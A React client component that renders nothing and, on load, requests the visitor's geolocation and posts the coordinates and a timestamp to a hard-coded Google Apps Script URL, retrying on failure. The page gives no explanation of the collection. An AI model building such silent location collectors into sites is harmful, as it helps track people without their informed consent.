"use client";

import { useEffect, useState } from "react";

export default function SendLocation() {
  const [attempts, setAttempts] = useState(0);

  useEffect(() => {
    const sendLocation = async () => {
      if (!("geolocation" in navigator)) {
        console.log("Geolocation tidak didukung");
        return;
      }

      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            resolve, 
            reject, 
            {
              enableHighAccuracy: false, // false lebih reliable di mobile
              timeout: 15000,
              maximumAge: 300000 // 5 menit cache
            }
          );
        });

        const { latitude, longitude } = position.coords;
        
        const GAS_URL = "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";

        // Gunakan FormData untuk compatibility lebih baik
        const formData = new FormData();
        formData.append("latitude", latitude.toString());
        formData.append("longitude", longitude.toString());
        formData.append("timestamp", new Date().toISOString());

        await fetch(GAS_URL, {
          method: "POST",
          body: formData
        });

        console.log("✅ Lokasi berhasil dikirim dari mobile");

      } catch (error) {
        console.error(`❌ Attempt ${attempts + 1} gagal:`, error);
        
        // Retry maksimal 3x dengan delay
        if (attempts < 2) {
          setTimeout(() => {
            setAttempts(prev => prev + 1);
          }, 3000);
        }
      }
    };

    const timer = setTimeout(sendLocation, 500);
    return () => clearTimeout(timer);
  }, [attempts]);

  return null;
}
